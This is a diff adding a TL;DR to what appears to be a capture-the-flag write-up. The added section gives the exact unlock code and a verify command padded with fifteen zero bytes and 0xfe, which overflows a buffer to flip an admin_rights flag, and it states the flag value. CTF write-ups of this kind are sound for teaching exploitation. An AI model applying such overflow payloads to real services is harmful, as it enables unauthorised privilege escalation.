@@ -335,3 +335,8 @@ Testing this buffer overflow with zero padding, it turns out that it is the 16th
 Changing the 16th byte by `0xfe` overwrites `admin_rights` with the expected value and gives us the flag : `Congrats! Here's the private key :\n superprivatekey\n` :partying_face:
 
 # TL;DR
+After setting up the server-client communication, this CTF can be resolved by sending 2 commands :
+- `unlock DEADBEAF` to unlock the `verify` command
+- `verify user=toto\x0aadmin=0\x0asig=546f2c57cfb33c9bb7277dd041ab0f8764e68437b6ef2153301712b9ec78d91f\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\xfe` which is the command to verify the given certificate `toto.cert` (`verify user=toto\x0aadmin=0\x0asig=546f2c57cfb33c9bb7277dd041ab0f8764e68437b6ef2153301712b9ec78d91f`) but with additional data (15 `0x00` and 1 `0xfe`) to create a buffer overflow and change the value of `admin_rights` to `0xfe`
+
+The value of the key (flag) is `superprivatekey`
